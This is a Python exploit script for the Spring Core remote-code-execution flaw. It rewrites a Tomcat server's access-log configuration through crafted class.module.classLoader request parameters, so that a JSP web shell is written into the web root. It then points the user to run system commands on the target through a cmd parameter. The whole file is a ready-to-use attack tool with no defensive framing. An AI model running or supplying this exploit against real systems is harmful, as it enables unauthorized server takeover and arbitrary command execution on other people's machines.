# Author: @cxzero
# Based off the original work of p1n93r and @Rezn0k

import requests
import argparse
from urllib.parse import urlparse, quote
import time

#Set to bypass errors if the target site has SSL issues
requests.packages.urllib3.disable_warnings()

get_headers = {
    "prefix": "<%",
    "suffix": "%><!--//",
    # This may seem strange, but this seems to be needed to bypass some check that looks for "Runtime" in the log_pattern
    #"c": "Runtime",
}

def run_exploit(url, directory, filename, proxy):

    proxies = {
        "http" : proxy,
        "https" : proxy
    }

    #log_pattern_value = '%{prefix}i java.io.InputStream in = %{c}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } %{suffix}i'
    log_pattern = '%{prefix}i java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } %{suffix}i'

    params = {
        'class.module.classLoader.resources.context.parent.pipeline.first.pattern' : log_pattern,
        'class.module.classLoader.resources.context.parent.pipeline.first.suffix' : '.jsp',
        'class.module.classLoader.resources.context.parent.pipeline.first.directory' : directory,
        'class.module.classLoader.resources.context.parent.pipeline.first.prefix' : filename,
        'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat' : ''
    }

    # Change the tomcat log location variables
    print("[*] Modifying Log Configurations")
    ret = requests.get(url, headers=get_headers, params=params, verify=False, proxies=proxies)
    print("[*] Response code: %d" % ret.status_code)


def main():
    parser = argparse.ArgumentParser(description='Spring Core RCE')
    parser.add_argument('--url',help='target url', required=True)
    parser.add_argument('--file', help='File to write to [no extension]', required=False, default="shell")
    parser.add_argument('--dir', help='Directory to write to. Suggest using "webapps/[appname]" of target app', required=False, default="webapps/ROOT")
    parser.add_argument('--proxy', help='The proxy useful for HTTP message inspection (Default: None)', required=False, default=None)

    file_arg = parser.parse_args().file
    dir_arg = parser.parse_args().dir
    url_arg = parser.parse_args().url
    proxy_arg = parser.parse_args().proxy

    filename = file_arg.replace(".jsp", "")

    if url_arg is None:
        print("Must pass an option for --url")
        return

    try:
        run_exploit(url_arg, dir_arg, filename, proxy_arg)
        print("[+] Exploit completed")
        print("[+] Check your target for a shell")
        print("[+] File: " + filename + ".jsp")

        if dir_arg:
            location = urlparse(url_arg).scheme + "://" + urlparse(url_arg).netloc + "/" + filename + ".jsp"
        else:
            location = f"Unknown. Custom directory used. (try app/{filename}.jsp?cmd=id"
        print(f"[+] Shell should be at: {location}?cmd=id")
    except Exception as e:
        print(e)


if __name__ == '__main__':
    main()
